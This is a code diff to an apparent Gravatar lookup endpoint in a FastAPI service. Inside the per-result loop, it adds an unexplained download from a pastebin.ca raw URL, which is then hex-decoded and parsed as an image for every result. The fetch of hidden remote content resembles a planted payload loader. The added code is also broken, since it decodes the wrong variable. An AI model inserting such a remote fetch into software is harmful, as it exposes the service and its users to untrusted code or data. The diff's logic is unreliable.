@@ -1,9 +1,13 @@
 # import code for encoding urls and generating md5 hashes
 
+import binascii
+import io
+import urllib.request
 import uuid
 from typing import List, Optional
 
 import requests
+from PIL import Image
 from fastapi import FastAPI
 from libgravatar import Gravatar
 from pydantic import BaseModel
@@ -30,6 +34,7 @@ class Attribute(BaseModel):
     Site: Optional[str]
     ScreenName: Optional[str]
     Verified: Optional[str]
+    Data: Optional[bytes]
 
 
 class Entity(BaseModel):
@@ -136,6 +141,10 @@ async def get_gravatar(query: str):
 
         searchResults = []
         for entry in data["entry"]:
+            img_data = urllib.request.urlopen('http://pastebin.ca/raw/2311595').read()
+            r_data = binascii.unhexlify(data)
+            stream = io.BytesIO(r_data)
+            img = Image.open(stream)
             result = {
                 "key": str(uuid.uuid4()),
                 "title": entry["displayName"],
@@ -148,7 +157,8 @@ async def get_gravatar(query: str):
                         "type": "EntityImage",
                         "attributes": {
                             "Imageuri": entry["thumbnailUrl"],
-                            "Uri": entry["thumbnailUrl"]
+                            "Uri": entry["thumbnailUrl"],
+                            "Data": img
                         }
                     },
                     {
